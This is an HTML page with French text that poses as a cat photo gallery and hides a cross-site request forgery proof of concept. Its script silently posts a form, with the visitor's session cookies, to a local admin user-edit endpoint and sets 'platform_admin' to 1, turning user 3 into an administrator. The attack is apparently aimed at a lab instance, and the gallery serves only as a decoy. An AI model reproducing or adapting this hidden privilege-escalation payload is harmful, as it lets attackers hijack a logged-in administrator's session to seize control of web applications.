<!DOCTYPE html>
<html>
  <head>
    <style>
      body {
        font-family: Arial, sans-serif;
        text-align: center;
        margin: 20px;
      }

      h3 {
        margin-bottom: 20px;
      }

      .photos-chat {
        margin-bottom: 20px;
      }

      .photos-chat img {
        width: 150px;
        height: auto;
        display: block;
        margin: 10px auto;
      }
    </style>
  </head>
  <body>
    <h3>Bienvenue sur ma galerie de chats</h3>
    <div class="photos-chat">
      <img src="cutecat1.png" alt="Chat mignon 1" />
      <img src="cutecat2.png" alt="Chat mignon 2" />
      <img src="cutecat3.png" alt="Chat mignon 3" />
    </div>


    <script>
      const data = new FormData();

      // Valeurs obligatoires
      data.append("firstname", "Juan");
      data.append("lastname", "Hernandez");
      data.append("email", "juan.hernandez@email.fr");
      data.append("username", "user");
      data.append("_qf__user_edit", "");

      // Partie qui permet de changer le statut de l'utilisateur en admin
      data.append("platform_admin", "1");

      fetch("http://localhost:8081/main/admin/user_edit.php?user_id=3", {
        method: "POST",
        body: data,
        credentials: "include",
      })
        .then((response) => {
          console.log("Request sent successfully:", response);
        })
        .catch((error) => {
          console.error("Error sending request:", error);
        });
    </script>
  </body>
</html>
